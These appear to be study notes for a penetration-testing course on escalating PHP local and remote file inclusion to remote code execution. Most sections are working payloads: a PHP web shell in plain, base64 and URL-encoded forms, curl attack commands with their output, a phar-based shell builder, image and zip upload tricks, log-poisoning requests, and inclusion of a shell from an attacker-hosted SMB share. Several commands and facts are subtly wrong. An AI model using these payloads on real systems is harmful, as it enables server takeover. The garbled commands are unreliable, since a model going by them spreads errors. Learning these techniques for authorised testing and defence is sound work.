# Remote Code Execution
## PHP Wrappers

Not only we can read files, but we can achieve RCE and execute commands on the backend.

A way to do this is to enumerate user credentials and SSH keys, then use them to login to the back-end via SSH.

For example we can find a db password in a file such as `config.php` which can match the user's password.

Or we can check the `.ssh` directory and if read privileges are not set properly we can grab their private key, and use it to SSH into the system.

### Data

The `data` wrapper can be used to include external data, like PHP code.

But this wrapper can be used only if the `allow_url_include` setting is enabled in the PHP configuration.

It's not really uncommon to see this option enabled, as many web apps rely on it to function, such as some `WordPress` plugins and themes.

#### RCE

With the `allow_url_include` enabled we can use the `data` wrapper attack.

So we will pass some php code in base64 encoded with `text/plain:base64` and it has the ability to decode and execute.

So first let's encode it:

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now `URL-encode` it and pass it with the `data` wrapper, and then we can pass commands to the web shell with `&cmd=`.

```http
http://<SERVER_IP>:<PORT>/index.php?language=dcPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### Input

Similar to the `data` wrapper, `input` wrapper can be used to include external input and execute PHP code.

The difference is that in the `input` wrapper we pass the input as a `POST` request's data.

This means that the vulnerable parameter must accept `POST` requests. 

Same as with the `data` wrapper, in order for this to be successful `allow_url_include` must be set.

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://server:PORT/index.php?language=php://input&cmd=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expect

This allows us also to directly run commands through URL streams. 

Here we don't need to provide a web shell, because it is designed to execute commands.

This is an `external wrapper` so it needs to be installed manually and enabled on the back-end server, and some web apps need this for their core functionality.

We can see if itt's installed on the backend in the same way as we did with the `allow_url_include`, but we `grep` for `expect`:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

And then the `expect` wrapper can be used as follows:

```sh
curl -s "http://server:PORT/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)

If the vulnerable function allows the inclusion of remote URLs, we can include remote files not only local files.

This allows two main benefits:
- Enumerating local-only ports and web apps (i.e. SSRF)
- Getting RCE by including a malicious script that we host

### LFI vs RFI

| Function | Read | Execute |Remote URL|
|----------|------|---------|----------|
|**PHP**||||
|_include(), /include_once()|yes|yes|yes|
|file_get_contents()|yes|no|yes|
|**Java**||||
|import|yes|yes|yes|
|**.Net**||||
|@Html.RemotePartial()|yes|no|yes|
|include|yes|yes|yes|

So, almost every RFI is an LFI.

But, an LFI not alwasy is RFI, because:
- The function may not allow including remote URLs
- You control a portion of the filename and not the entire protocol wrapper (http://, https://, ftp://)
- Configuration prevents RFI - Modern web browsers disable it by default.

### Verify RFI

Since this setting is usually disabled by default, in PHP any remote URL inclusion requires `allow_url_include` enabled.

Checking whether it is enabled via:

```sh
echo '_base64-encoded-config_' | base64 -d | grep allow_url_include
```

may not be always reliable, because even if the setting is enabled, it may not allow remote URL inclusion.

A more reliable way is to `try and include a URL` and check if we can get the content.

First - try to include a local URL to check that our attempt is not blocked by a *firewall*.

`http://server:port/index.php?language=http://127.0.0.1:80/index.php`

If the code is executed it means that we can also execute a malicious file.

### RCE with RFI

First step - create a malicious script.

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now host the script and include it through RFI.

A good idea to listen on a common HTTP port (80, 443), as they may be whitelisted in the case of a firewall.

#### Host it in FTP

We can use `pyftpdlib`:

```sh
sudo python -m -m pyftpdlib -p 21
```
This can be used if http ports are blocked.

#### SMB

If the web app is hosted on Windows (can be told from the server version in the HTTP response headers) - we don't need the `allow_url_include` enabled.

We can use the SMB protocol for the RFI, as Windows treats files on remote SMB servers as normal files, and can be referenced directly with a UNC path.

An SMB server can be started using `Impacket's smbserver.py`, which allows anonymous authentication:

```sh
impacket-smbserver -smb2support share $(cmd)
```

Include hte script by using a UNC path:

`http://server:port/index.php?language=\\<our_ip>\share\shell.php&cmd=whoami`


## LFI and LFI Uploads

File upload functionalities can be vulnerable and can be used for LFI.

If the function has code execute capabilities, the code within the file we upload will be executed if we include it, regardless of the file extension or file type.

We can upload an `jpg` file and store a PHP web shell code within, and if we include it through the LFI, the PHP code will be executed.

These following functions allow execute:

```php
PHP
include();
include_once();
require();
require_once();
```

```js
NodeJS
res.render();
```

```java
JAVA
import
```

```.NET
.NET
include
```

### Image Upload

It's very common on a lot of web apps, and we can craft a malicious image, and use it for RCE.

#### Craft a malicious Image

First step is to use an allowed image extension, like `.gif`, and the `image magic bytes` like for gif for example `GIF8`.

```sh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
The file on its own is harmless, but when combined with an LFI, we can reach RCE.

Once, we upload the file, we need to include it through the LFI vuln, and to do that we need to know the path to the uploaded file.

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Now include the file in the LFI vulnerable function, and the PHP code will be executed:

```http
http://server:port/index.php?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload

There are a number of PHP-only techniques that utilize PHP wrappers to achieve the same goal, and these can become handy where the above technique doesn't work.

We can use the `zip` wrapper to execute PHP code.

This wrapper isn't enabled by default.

To do this, we can create a PHP web shell and zip it into a zip (named `shell.jpg`) archive:

```sh
'<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Now, when we upload it, we use hte `zip` wrapper:

`zip://shell.jpg`

```http
http://server:port/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload

Similar result can be done using the `phar://` wrapper.

First wrote the php script in a `shell.php`:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file and when it is called it would write a web shell to a `shell.txt` sub-file, which we will use to interact with.

Compile it into a `phar` and rename to `shell.jpg`:

```sh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload it and simply call it with the `phar://`, provide the URL path, and specify the sub-file with `/shell.txt` (URL encoded):

```http
http://server:port/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
## Log Poisoning

The attacks here rely on: Writing PHP code in a field we control that gets logged into a log file, and then include that log file to execute the PHP code.

The PHP web app should have read privileges over the logged files, which is different from server to server.

### PHP Session Poisoning

Most web apps utilize the `PHPSESSID` cookies.

They hold specific user-related data on the back-end, to keep track of these details through cookies.

These are stored in`session` files and stored on `/va/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows.

The filename has a `sess_` prefix and matches the `PHPSESSID` cookie.

First thing after we see the value of the cookie, use LFI to view the contents.

For example: `pagejs:6:"en.php":preferencejs:7:"English"...`, and here we see the `page` which shows the selected language page, and `preference` which shows the selected language.

We have under control the `page` value, using the `?language=` parameter.

So now we can poison it by writing PHP code to the session file.

URL-encode the web shell:

`<?php system($_GET["cmd"]);?>`

`http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`

Now include the session file and use the `&cmd=` to execute commadns.

### Server Log Poisoning

Both `Apache` and `Nginx` have log files such as `access.log` and `error.log`.

- `access.log` has information about all requests made to the server, including the `User-Agent` header form the request. As we can control it, we can also poison it.

If we have read access to the logs, then we can use the LFI to access it.

`Apache` logs are only readable by users with high privileges.

- Apache logs - `/var/log/apache2/` on Linux, `C:\xampp\apache\logs\` on Windows
- Nginx logs = `/var/log/nginx` on Linux, and `C:\nginx\log\` on Windows.

They can be on different locations, so we may need to fuzz it with the `LFI Wordlist`.


